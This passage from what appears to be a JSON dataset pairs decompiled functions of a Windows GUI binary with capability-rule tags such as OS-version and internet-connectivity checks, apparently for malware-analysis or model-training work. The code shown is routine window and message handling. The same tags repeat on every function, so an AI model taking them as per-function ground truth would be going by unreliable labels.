{\n                case 0x200:\n                    func_0x00447274();\n                    break;\n                case 0x201:\n                case 0x203:\n                    if (*(in_EAX + 0x5d) == '\\x01') {\n                        fcn.0040484c();\n                        return;\n                    }\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 1;\n                    break;\n                case 0x202:\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfffe;\n                    break;\n                default:\n                    if (((*(*0x49ac5c + 0x20) != '\\0') && (*(*0x49ac5c + 0x1c) != 0)) &&\n                       (*param_2 == *(*0x49ac5c + 0x1c))) {\n                        sub.user32.dll_GetKeyboardState(&lpKeyState);\n                        var_10h = *param_2;\n                        var_ch._0_1_ = fcn.0043bc2c();\n                        var_ch._2_2_ = *(param_2 + 1);\n                        var_8h = param_2[2];\n                        fcn.0040484c();\n                        return;\n                    }\n                    break;\n                case 0x207:\n                    if ((((*(in_EAX + 0x52) & 8) != 0) && (*0x451e90 == (*0x451e8c & *(in_EAX + 0x15)))) &&\n                       (cVar3 = fcn.0045d534(),  cVar3 == '\\0')) {\n                        fcn.0045d4c0();\n                        var_15h._0_1_ = '\\0';\n                        piVar2 = *(*0x49ac5c + 0x28);\n                        if (piVar2 != NULL) {\n                            cVar3 = fcn.004047dc();\n                            if (cVar3 == '\\0') {\n                                if (in_EAX[0xc] == 0) {\n                                    *NULL = fcn.0043bd2c();\n                                    if (*NULL != NULL) {\n                                        fcn.00458594();\n                                        var_15h._0_1_ = (**(**(*0x49ac5c + 0x28) + 0xe0))();\n                                    }\n                                }\n                                else {\n                                    fcn.00458594();\n                                    var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                                }\n                            }\n                            else {\n                                fcn.00458594();\n                                var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                            }\n                        }\n                        if (var_15h == '\\0') {\n                            if (*(*0x49ac5c + 0x28) != 0) {\n                                fcn.0045d600();\n                            }\n                        }\n                        else {\n                            param_2[3] = 1;\n                            fcn.004473cc();\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            *NULL = fcn.0043bd2c();\n            if ((*NULL != NULL) && (cVar3 = (**(**NULL + 0x100))(),  cVar3 != '\\0')) {\n                return;\n            }\n        }\n        (**(*in_EAX + -0x14))();\n    }\n    return;\n}\n",
        "token_count": 1131
    },
    "00451f70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451f70(int32_t arg_8h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    \n    if (in_AL == '\\0') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x180))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x452180 == (*(*(arg_8h + -8) + 0x61) & *0x45217c))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x40))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x01') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x184))) ||\n           (((*(*(arg_8h + -4) + 0x20) == 0 &&\n             ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x452180 == (*(*(arg_8h + -8) + 0x61) & *0x452184))))) &&\n            (iVar1 = *(*(arg_8h + -8) + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x44))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x02') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x188))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x452188 == (*(*(arg_8h + -8) + 0x61) & *0x452188))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x48))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if ((in_AL == '\\x03') &&\n            (((iVar1 = *(*(arg_8h + -4) + 0x20),  iVar1 != 0 &&\n              (iVar1 = *(iVar1 + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x18c))) ||\n             (((*(*(arg_8h + -4) + 0x20) == 0 &&\n               ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x45218c == (*(*(arg_8h + -8) + 0x61) & *0x45218c))))) &&\n              (iVar1 = *(*(arg_8h + -8) + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x4c))))))) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 891
    },
    "004523ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004523ac(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xc2) != 0) {\n        (**(in_EAX + 0xc0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0045252c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.0045252c(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    uVar1 = *param_2;\n    uVar2 = *param_1;\n    cVar3 = fcn.00451954();\n    if (cVar3 != '\\0') {\n        if (((*(in_EAX + 0x5c) == '\\0') || (cVar3 = fcn.004518e8(),  cVar3 != '\\0')) ||\n           (cVar3 = fcn.00451954(),  cVar3 != '\\0')) {\n            cVar4 = '\\x01';\n        }\n        else {\n            cVar4 = '\\0';\n        }\n        if (cVar4 != '\\0') {\n            *param_2 = uVar1;\n            *param_1 = uVar2;\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 237
    },
    "00452678": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00452678(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        (**(in_EAX + 200))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00452724": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00452724(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xd2) != 0) {\n        (**(in_EAX + 0xd0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00452a30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452a30(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x5a) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            fcn.004529f8(&stack0xfffffffc);\n        }\n        else {\n            fcn.004529f8(&stack0xfffffffc);\n        }\n        *(in_EAX + 0x5a) = 1;\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00452b00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452b00(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*(*0x495d2c + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00452b8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00452b8c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x56) != '\\0') {\n        fcn.00450924();\n        *(in_EAX + 0x56) = 1;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00452d48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452d48(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x54))();\n    if ((cVar1 == '\\0') || (in_EAX[0xc] == 0)) {\n        iVar2 = fcn.00452c38();\n        if (iVar2 != 0) {\n            *(*(param_2 + 8) + 8) = iVar2;\n            uVar3 = fcn.00458594();\n            *(*(param_2 + 8) + 0xc) = uVar3;\n        }\n    }\n    else {\n        fcn.00452cbc(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00452da8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00452def)\n\nvoid __fastcall fcn.00452da8(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x452e98;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        if (param_1 != '\\0') {\n            fcn.00450830();\n        }\n        fcn.00450860();\n        if ((param_1 == '\\0') || (cVar1 = (**(*in_EAX + 0x50))(),  cVar1 == '\\x01')) {\n            (**(*in_EAX + 0x68))();\n        }\n        if ((param_1 == '\\0') || (in_EAX[0x21] == 0)) {\n            fcn.00405584();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x57) == '\\x01')) {\n            fcn.00450750();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x112) == 0)) {\n            in_EAX[0x44] = *(param_2 + 0x40);\n            in_EAX[0x45] = *(param_2 + 0x44);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x452e9f;\n    uStack32 = 0x452e97;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 434
    },
    "004531d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004531d4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uStack64;\n    uint uStack60;\n    int16_t iStack55;\n    int16_t iStack53;\n    uchar auStack28 [12];\n    \n    if (*(param_2 + 0xc) == 0) {\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            iStack55 = *(param_2 + 8);\n            iStack53 = *(param_2 + 8) >> 0x10;\n            cVar1 = fcn.004184b4(iStack55, iStack53);\n            if (cVar1 == '\\0') {\n                fcn.00450370();\n                (**(*in_EAX + 0x44))(uStack64, uStack60);\n                iVar2 = sub.user32.dll_PtInRect(auStack28);\n                if (iVar2 == 0) {\n                    (**(*in_EAX + -0x10))();\n                    return;\n                }\n            }\n            fcn.0040484c();\n            *(param_2 + 0xc) = 0;\n            piVar3 = fcn.0040484c();\n            if ((piVar3 != NULL) && (*(piVar3 + 0x61) != '\\0')) {\n                fcn.0045039c();\n                piVar3[0x19] = in_EAX;\n                cVar1 = fcn.004184b4();\n                if (cVar1 != '\\0') {\n                    fcn.00418428();\n                    fcn.004502c0();\n                }\n                (**(*piVar3 + 0x40))();\n                *(param_2 + 0xc) = 1;\n            }\n            if (*(param_2 + 0xc) == 0) {\n                (**(*in_EAX + -0x10))();\n            }\n        }\n        else {\n            (**(*in_EAX + -0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "00453614": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00453614(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char extraout_DL;\n    \n    piVar1 = fcn.00404a1c();\n    fcn.00420224();\n    if (*(piVar1 + 0x77) != '\\0') {\n        *(piVar1 + 0x77) = 0;\n        fcn.0044e13c();\n    }\n    fcn.0040700c();\n    fcn.00404650();\n    if (piVar1[0xc] != 0) {\n        fcn.00454400();\n    }\n    if (piVar1[0x6d] != 0) {\n        (**(*piVar1 + 0xb4))();\n    }\n    iVar2 = fcn.00454684();\n    while (iVar2 != 0) {\n        piVar3 = fcn.00454648();\n        fcn.0045446c();\n        (**(*piVar3 + -4))();\n        iVar2 = fcn.00454684();\n    }\n    fcn.00404650();\n    if (piVar1[0x70] != 0) {\n        fcn.004210c8();\n    }\n    fcn.00404650();\n    fcn.0044f790();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "004536f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004536f4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x1d0) == 0) {\n        return;\n    }\n    puStack28 = 0x45371b;\n    fcn.00404620();\n    uStack32 = 0x4537b8;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar3 = *(*(in_EAX + 0x1d0) + 8);\n    puStack28 = &stack0xfffffffc;\n    fcn.00419a54();\n    iVar2 = iVar3;\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar1 = fcn.004198b4();\n            if ((-1 < *(iVar1 + 0x1d4)) && (*(iVar1 + 0x1d4) < iVar3)) {\n                fcn.004199a8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar2 = fcn.004198b4();\n            if (iVar2 != 0) {\n                fcn.004587d4();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4537bf;\n    uStack32 = 0x4537b7;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 425
    },
    "00453e28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453e28(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    (**(**(arg_8h + -0xc) + 8))();\n    if (((*(arg_8h + -0x10) != 0) &&\n        (((in_AL == '\\0' || (*(*(arg_8h + -0x10) + 0x57) != '\\0')) ||\n         (((*(*(arg_8h + -0x10) + 0x1c) & 0x10) != 0 && ((*(*(arg_8h + -0x10) + 0x51) & 4) == 0)))))) &&\n       (in_AL == *(*(arg_8h + -0x10) + 0x5b))) {\n        fcn.0041975c();\n    }\n    var_8h = fcn.00454684();\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = fcn.00454648();\n            if (((in_AL == *(iVar2 + 0x5b)) &&\n                (((((in_AL == '\\0' || (*(iVar2 + 0x57) != '\\0')) || (*0x453fb0 == (*0x453fb0 & *(iVar2 + 0x50)))) ||\n                  (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))) &&\n                 ((cVar1 = fcn.004047dc(),  cVar1 == '\\0' || ((*(iVar2 + 0x1c) & 0x10) == 0)))))) &&\n               (iVar2 != *(arg_8h + -0x10))) {\n                for (iVar2 = 0; iVar2 < *(*(arg_8h + -0xc) + 8); iVar2 = iVar2 + 1) {\n                    arg_8h_00 = arg_8h;\n                    fcn.004198b4();\n                    cVar1 = fcn.00453cb0(arg_8h_00);\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00419930();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    var_8h = *(*(arg_8h + -0xc) + 8);\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = arg_8h;\n            fcn.004198b4();\n            fcn.00453de0(iVar2);\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 690
    },
    "00453fb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00453fb4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00454684();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00454648();\n            if (*(iVar2 + 0x5b) != '\\0') {\n                return 1;\n            }\n            iVar2 = fcn.00454648();\n            if (*0x454004 != *(iVar2 + 0x61)) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 165
    },
    "00454008": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454008(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x77) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (in_EAX[0x6c] != 0)) {\n        (**(*in_EAX[0x6c] + 0x2c))();\n    }\n    uStack32 = 0x454052;\n    cVar1 = fcn.00453fb4(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x90))();\n        fcn.00404620();\n        uStack32 = 0x4540e7;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        fcn.00453e28(&stack0xfffffffc);\n        fcn.00453e28(&stack0xfffffffc);\n        fcn.00453e28(&stack0xfffffffc);\n        fcn.00453e28(&stack0xfffffffc);\n        fcn.00453e28(&stack0xfffffffc);\n        fcn.00453e28(&stack0xfffffffc);\n        fcn.00453e28(&stack0xfffffffc);\n        fcn.0040484c();\n        *in_FS_OFFSET = uStack36;\n        uStack32 = 0x4540e6;\n        fcn.00404650();\n        return;\n    }\n    if (*(in_EAX + 0x1da) != '\\0') {\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 415
    },
    "0045410c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045410c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack32 = 0x454120;\n    cVar1 = fcn.004588a0();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 8) == 0)) {\n        if (*(in_EAX + 100) == 0) {\n            puStack32 = 0x45414c;\n            fcn.004541a0();\n            uStack36 = 0x454193;\n            uStack40 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd8;\n            puStack32 = &stack0xfffffffc;\n            (**(*in_EAX + 0x44))();\n            (**(*in_EAX + 0x94))();\n            *in_FS_OFFSET = uStack40;\n            puStack32 = 0x45419a;\n            *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n            uStack36 = 0x454192;\n            fcn.004541a8();\n            return;\n        }\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) | 0x10;\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "004541a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004541a8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 400) = *(in_EAX + 400) + -1;\n    if ((*(in_EAX + 400) == 0) && ((*(in_EAX + 0x54) & 0x10) != 0)) {\n        fcn.004541c8();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004546a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004546a4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00454684();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00454648();\n            (**(iVar2 + 0x38))();\n            if (*(param_2 + 0xc) != 0) {\n                return;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "004548d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004548d0(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint *arg_ch;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint lpWndClass;\n    code *var_b0h;\n    uint var_8ch;\n    uint var_85h;\n    int32_t var_70h;\n    uint var_68h;\n    code *var_64h;\n    uint hInstance;\n    uint *var_44h;\n    uint lpClassName;\n    \n    puStack208 = &stack0xfffffffc;\n    uStack212 = 0x454a91;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack216;\n    (**(*in_EAX + 0x9c))();\n    if ((var_70h == 0) && ((var_85h & 0x40) != 0)) {\n        if ((in_EAX[1] != 0) && ((*(in_EAX[1] + 0x1c) & 2) != 0)) {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                var_70h = fcn.00458594();\n                goto code_r0x0045497c;\n            }\n        }\n        var_bch = in_EAX[2];\n        var_b8h._0_1_ = 0xb;\n        arg_ch = &var_bch;\n        uVar5 = 0;\n        fcn.00407550();\n        fcn.0040db40(uVar5, arg_ch);\n        fcn.00404ec4();\n    }\ncode_r0x0045497c:\n    in_EAX[0x6a] = var_64h;\n    iVar3 = sub.user32.dll_GetClassInfoA(hInstance, &lpClassName, &lpWndClass);\n    if ((iVar3 == 0) || (var_b0h != fcn.0044d14c)) {\n        if (iVar3 != 0) {\n            sub.user32.dll_UnregisterClassA(&lpClassName, hInstance);\n        }\n        var_64h = fcn.0044d14c;\n        var_44h = &lpClassName;\n        iVar2 = sub.user32.dll_RegisterClassA(&var_68h);\n        if (iVar2 == 0) {\n            fcn.0040f274();\n        }\n    }\n    *0x493650 = in_EAX;\n    (**(*in_EAX + 0xa0))();\n    if (in_EAX[0x6d] == 0) {\n        fcn.0040f274();\n    }\n    uVar4 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff0);\n    if ((uVar4 & 0x40000000) != 0) {\n        iVar3 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff4);\n        if (iVar3 == 0) {\n            sub.user32.dll_SetWindowLongA(in_EAX[0x6d], 0xfffffff4, in_EAX[0x6d]);\n        }\n    }\n    fcn.0040ab10();\n    in_EAX[0x19] = 0;\n    fcn.004588ac();\n    uVar5 = 1;\n    fcn.004246e8();\n    fcn.00451ae8(uVar5);\n    if (*(in_EAX + 0x17) != '\\0') {\n        fcn.0040484c();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.00405530(0x454a98);\n    return;\n}\n",
        "token_count": 898
    },
    "00454b80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00454b80(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    if ((*(*(arg_8h + -4) + 0x20) == 0) || (cVar1 = fcn.00454b6c(),  cVar1 == '\\0')) {\n        iVar3 = *(*(arg_8h + -8) + 0x1cc);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.004198b4();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x454c5c != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = *(*(arg_8h + -8) + 0x1d0);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.004198b4();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x454c5c != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 385
    },
    "00454e84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
